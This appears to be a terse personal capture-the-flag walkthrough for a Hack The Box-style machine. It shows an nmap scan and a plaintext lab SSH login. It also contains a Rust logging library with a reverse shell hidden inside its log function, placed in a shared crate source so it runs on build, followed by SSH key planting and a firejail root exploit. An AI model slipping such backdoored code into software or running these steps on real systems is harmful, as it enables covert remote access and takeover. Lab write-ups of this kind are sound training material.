
Nmap scanning:

~~~
nmap 10.10.11.218 -sC -sV 
~~~

~~~
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 09:39 EDT
Nmap scan report for 10.10.11.218
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-title: 400 The plain HTTP request was sent to HTTPS port
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.36 seconds
~~~

ssh id and password

~~~
silentobserver:quietLiketheWind22

~~~


~~~
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
    let sock = TcpStream::connect("$IP:4444").unwrap();

    // a tcp socket as a raw file descriptor
    // a file descriptor is the number that uniquely identifies an open file in a computer's operating system
    // When a program asks to open a file/other resource (network socket, etc.) the kernel:
    //     1. Grants access
    //     2. Creates an entry in the global file table
    //     3. Provides the software with the location of that entry (file descriptor)
    // https://www.computerhope.com/jargon/f/file-descriptor.htm
    let fd = sock.as_raw_fd();
    // so basically, writing to a tcp socket is just like writing something to a file!
    // the main difference being that there is a client over the network reading the file at the same time!

    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
~~~


change the ip and port in the file send the file to the ssh as lib.rs

and the cp the lib.rs to this directory /opt/crates/logger/src in the ssh 

by we get the shell

![[Screenshot from 2023-10-30 09-31-09 2.png]]

create the ssh id with the ss-keygen tool in the .ssh directory

and send the id_rsa file to atlas user shell and the mv the file id_rsa as the name of authorized_keys  
horizontal privelages of other user
with this we take the ssh of the atlas 

In this ssh  send the exploit.py file and te run the file in ssh 
https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25

![[Screenshot from 2023-10-30 09-31-46.png]]

open second ssh for the atlas in the ssh enter the firejail id 
and give the su and we get the root access

![[Screenshot from 2023-10-30 09-30-49.png]]



https://doc.rust-lang.org/std/process/struct.Command.html#method.new

